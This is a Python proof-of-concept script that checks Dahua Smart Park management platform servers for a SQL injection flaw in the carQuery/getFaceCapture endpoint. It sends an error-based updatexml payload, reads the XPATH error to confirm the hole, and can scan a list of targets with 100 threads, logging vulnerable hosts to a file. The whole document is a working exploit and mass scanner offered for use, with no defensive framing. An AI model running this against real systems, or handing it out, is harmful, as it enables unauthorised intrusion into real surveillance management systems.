import argparse,requests,sys,re,json  # 导包
from multiprocessing.dummy import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """███████╗ ██████╗ ██╗     
██╔════╝██╔═══██╗██║     
███████╗██║   ██║██║     
╚════██║██║▄▄ ██║██║     
███████║╚██████╔╝███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝
          version=1.1.1               """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台-SQL注入')  # 定义脚本信息
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')  # 定义参数
    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:  # 单个url
        poc(args.url)
    elif args.file and not args.url:  # 多线程
        urls = []
        with open(args.file,'r',encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                urls.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urls)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(targer):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20MD5(1)),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
    }
    try:
        res1 = requests.get(url=targer+payload,headers=headers,verify=False,timeout=5)  # get发送请求
        # print(res1.text)
        match = re.findall(r"XPATH syntax error: '([^']+)';",res1.text)  # 转化为正则表达式
        if '~c4ca4238a0b923820dcc509a6f75849' == match[0]:  # 判断是否存在漏洞
            print(f"[+]漏洞存在{targer}")
            with open('result.txt', 'a', encoding='utf-8') as fp:  # 将漏洞写入到文件中
                fp.write(targer + '\n')
        else:
            print(f"[-]漏洞不存在{targer}")
    except:
        pass


if __name__ == '__main__':
    main()